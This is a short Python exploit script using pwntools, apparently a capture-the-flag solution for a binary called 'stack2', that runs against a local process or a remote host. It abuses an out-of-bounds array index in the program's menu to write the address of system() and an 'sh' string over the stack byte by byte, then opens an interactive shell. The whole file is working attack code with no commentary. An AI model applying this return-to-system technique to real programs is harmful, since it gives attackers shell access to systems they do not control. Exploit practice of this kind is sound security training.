from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./stack2")
else:
	p = remote("111.198.29.45",32260)

def debugf():
	gdb.attach(p,"b *0x080488F2")

def change(index,target):
	for i in range(4):
		p.sendlineafter("5. exit\n","3")
		p.sendlineafter("change:\n",str(index+i))
		p.sendlineafter("number:\n",str(target&0xff))
		target = target >> 8

target = 0x0804859B
context.log_level = "debug"
p.sendlineafter("have:\n","0")
#p.sendlineafter("numbers\n",str(target))
#debugf()
system_addr = 0x08048450
sh = 0x08048980 + 7
change(132,system_addr)
change(140,sh)
p.sendlineafter("5. exit\n","5")

p.interactive()
